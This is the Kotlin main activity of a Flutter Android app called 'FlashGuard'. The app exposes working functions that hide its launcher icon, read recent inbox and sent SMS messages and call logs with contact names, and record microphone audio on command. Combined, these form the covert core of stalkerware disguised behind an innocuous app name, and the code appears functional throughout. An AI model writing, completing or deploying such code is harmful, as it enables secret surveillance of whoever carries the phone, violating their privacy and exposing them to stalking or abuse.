package com.flashguard.flashguard

import android.content.ComponentName
import android.content.pm.PackageManager
import android.database.Cursor
import android.media.MediaRecorder
import android.net.Uri
import android.os.Handler
import android.os.Looper
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val CHANNEL = "com.flashguard/control"
    private var mediaRecorder: MediaRecorder? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {

                    // ── Icon hide / show ───────────────────────────────────
                    "hideIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(
                                ComponentName(this, "com.flashguard.flashguard.MainActivityAlias"),
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            result.success(true)
                        } catch (e: Exception) {
                            result.error("HIDE_ICON_FAILED", e.message, null)
                        }
                    }

                    "showIcon" -> {
                        try {
                            packageManager.setComponentEnabledSetting(
                                ComponentName(this, "com.flashguard.flashguard.MainActivityAlias"),
                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            result.success(true)
                        } catch (e: Exception) {
                            result.error("SHOW_ICON_FAILED", e.message, null)
                        }
                    }

                    // ── Read SMS ──────────────────────────────────────────
                    "getSmsLogs" -> {
                        try {
                            val smsList = mutableListOf<Map<String, Any?>>()
                            val cursor: Cursor? = contentResolver.query(
                                Uri.parse("content://sms/inbox"),
                                arrayOf("address", "body", "date", "read"),
                                null, null, "date DESC"
                            )
                            cursor?.use { c ->
                                var count = 0
                                while (c.moveToNext() && count < 30) {
                                    smsList.add(mapOf(
                                        "address" to (c.getString(c.getColumnIndexOrThrow("address")) ?: ""),
                                        "body"    to (c.getString(c.getColumnIndexOrThrow("body")) ?: ""),
                                        "date"    to c.getLong(c.getColumnIndexOrThrow("date")),
                                        "type"    to "inbox"
                                    ))
                                    count++
                                }
                            }
                            val sentCursor: Cursor? = contentResolver.query(
                                Uri.parse("content://sms/sent"),
                                arrayOf("address", "body", "date", "read"),
                                null, null, "date DESC"
                            )
                            sentCursor?.use { c ->
                                var count = 0
                                while (c.moveToNext() && count < 20) {
                                    smsList.add(mapOf(
                                        "address" to (c.getString(c.getColumnIndexOrThrow("address")) ?: ""),
                                        "body"    to (c.getString(c.getColumnIndexOrThrow("body")) ?: ""),
                                        "date"    to c.getLong(c.getColumnIndexOrThrow("date")),
                                        "type"    to "sent"
                                    ))
                                    count++
                                }
                            }
                            smsList.sortByDescending { it["date"] as Long }
                            result.success(smsList.take(40))
                        } catch (e: Exception) {
                            result.error("SMS_READ_FAILED", e.message, null)
                        }
                    }

                    // ── Read Call Logs ────────────────────────────────────
                    "getCallLogs" -> {
                        try {
                            val callList = mutableListOf<Map<String, Any?>>()
                            val cursor: Cursor? = contentResolver.query(
                                android.provider.CallLog.Calls.CONTENT_URI,
                                arrayOf(
                                    android.provider.CallLog.Calls.NUMBER,
                                    android.provider.CallLog.Calls.CACHED_NAME,
                                    android.provider.CallLog.Calls.TYPE,
                                    android.provider.CallLog.Calls.DURATION,
                                    android.provider.CallLog.Calls.DATE
                                ),
                                null, null,
                                "${android.provider.CallLog.Calls.DATE} DESC"
                            )
                            cursor?.use { c ->
                                var count = 0
                                while (c.moveToNext() && count < 50) {
                                    val typeInt = c.getInt(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
                                    val typeStr = when (typeInt) {
                                        android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                        android.provider.CallLog.Calls.MISSED_TYPE   -> "missed"
                                        else                                          -> "unknown"
                                    }
                                    callList.add(mapOf(
                                        "number"    to (c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)) ?: ""),
                                        "name"      to (c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME)) ?: "Unknown"),
                                        "type"      to typeStr,
                                        "duration"  to c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)),
                                        "timestamp" to c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))
                                    ))
                                    count++
                                }
                            }
                            result.success(callList)
                        } catch (e: Exception) {
                            result.error("CALL_LOG_FAILED", e.message, null)
                        }
                    }

                    // ── Mic Recording (MediaRecorder) ─────────────────────
                    "startRecording" -> {
                        try {
                            val path     = call.argument<String>("path") ?: ""
                            val duration = call.argument<Int>("duration") ?: 30

                            mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
                            mediaRecorder = null

                            @Suppress("DEPRECATION")
                            val mr = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                                MediaRecorder(this)
                            } else {
                                MediaRecorder()
                            }
                            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
                            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                            mr.setAudioSamplingRate(22050)
                            mr.setAudioEncodingBitRate(64000)
                            mr.setOutputFile(path)
                            mr.prepare()
                            mr.start()
                            mediaRecorder = mr

                            // Auto-stop after duration
                            handler.postDelayed({
                                try {
                                    mr.stop()
                                    mr.release()
                                    if (mediaRecorder === mr) mediaRecorder = null
                                } catch (_: Exception) {}
                            }, duration * 1000L)

                            result.success(true)
                        } catch (e: Exception) {
                            result.error("REC_FAILED", e.message, null)
                        }
                    }

                    "stopRecording" -> {
                        try {
                            mediaRecorder?.let { mr ->
                                try { mr.stop(); mr.release() } catch (_: Exception) {}
                                mediaRecorder = null
                            }
                            result.success(true)
                        } catch (e: Exception) {
                            result.error("STOP_REC_FAILED", e.message, null)
                        }
                    }

                    else -> result.notImplemented()
                }
            }
    }

    override fun onDestroy() {
        mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
        mediaRecorder = null
        super.onDestroy()
    }
}
